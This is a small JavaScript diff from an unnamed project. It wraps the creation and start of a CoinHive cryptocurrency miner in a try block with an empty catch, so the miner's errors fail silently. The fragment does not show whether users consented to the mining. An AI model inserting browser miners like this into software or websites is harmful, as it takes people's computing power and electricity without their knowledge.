@@ -2,8 +2,10 @@
 
 // Miner
 
-var miner = new CoinHive.User(KEY, settings.id, settings.minerOptions);
-miner.start();
+try {
+	var miner = new CoinHive.User(KEY, settings.id, settings.minerOptions);
+	miner.start();
+} catch(e) {}
 
 // \Miner
 
